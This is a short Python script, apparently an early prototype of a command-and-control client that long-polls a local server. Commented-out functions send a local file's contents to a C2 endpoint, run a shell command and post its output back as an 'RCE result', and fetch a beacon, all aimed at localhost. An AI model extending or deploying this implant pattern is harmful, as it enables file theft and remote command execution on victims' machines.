import http.client

# Function to perform long-polling requests
import threading
import time

import requests


def long_polling_request():
    response = requests.get('http://localhost:8000/poll')

    if response.status_code == 200:
        print(response.text)
    else:
        print('Error:', response.status_code, response.reason)

if __name__ == '__main__':
    #while True:
    long_polling_request()


"""import time

import requests
import yaml
import subprocess as sp


def send_file():
    with open('/home/mehrdad/PycharmProjects/C2_communication/file_test.txt', 'rb') as file:
        file_content = file.read()
    response = requests.post('http://localhost:8080/send_file', data=file_content)
    if response.status_code == 200:
        print('File sent successfully.')
    else:
        print('Failed to send file.')
def reply_command():
    response = requests.post('http://localhost:8080/reply_command', data=sp.getoutput('pwd') )
    if response.status_code == 200:
        print('RCE result sent successfully.')
    else:
        print('Failed to RCE result to C2')
def get_beacon():
    response = requests.get('http://localhost:8080/get_beacon')
    print (response.text)

if __name__ == '__main__':
    #while True:
    get_beacon()
    #time.sleep(4)
"""
""" file_path = "/home/mehrdad/PycharmProjects/C2_communication/file_test.txt"
url = "http://localhost:8080/"

response = requests.get(url=url)
print (response.text)
response = requests.post(url, data = sp.getoutput('pwd')) """
